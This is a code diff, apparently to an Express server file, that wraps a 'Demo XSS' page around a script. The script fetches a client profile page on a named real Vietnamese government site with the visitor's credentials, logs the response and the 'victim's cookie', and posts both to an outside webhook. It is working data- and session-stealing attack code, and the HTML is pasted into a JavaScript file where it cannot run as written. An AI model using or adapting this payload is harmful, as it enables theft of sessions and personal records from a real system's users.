@@ -6,31 +6,41 @@ const PORT = 3006;
 
 app.use(express.json());
 
-<script>
-    var webhookUrl = "https://test-xss.onrender.com";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test XSS</title>
+</head>
+<body>
+    <h1>Demo XSS</h1>
+    <script>
+        var webhookUrl = "https://test-xss.onrender.com";
 
-    fetch("http://hoptacxacds.hagiang.gov.vn/clients/contact_profile/52/general", {
-        method: "GET",
-        credentials: "include" // Gửi cookie của người dùng
-    })
-    .then(response => response.text())
-    .then(data => {
-        if (data && data.trim().length > 0) {
-            console.log("Dữ liệu có chứa thông tin:", data);
-            console.log("Cookie của nạn nhân:", document.cookie);
+        fetch("http://hoptacxacds.hagiang.gov.vn/clients/contact_profile/52/general", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+            if (data && data.trim().length > 0) {
+                console.log("Dữ liệu có chứa thông tin:", data);
+                console.log("Cookie của nạn nhân:", document.cookie);
 
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    stolenData: data,
-                    cookies: document.cookie
-                })
-            });
-        }
-    })
-    .catch(error => console.error("Lỗi:", error));
-</script>
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        stolenData: data,
+                        cookies: document.cookie
+                    })
+                });
+            }
+        })
+        .catch(error => console.error("Lỗi:", error));
+    </script>
+</body>
+</html>
+
 
 
 
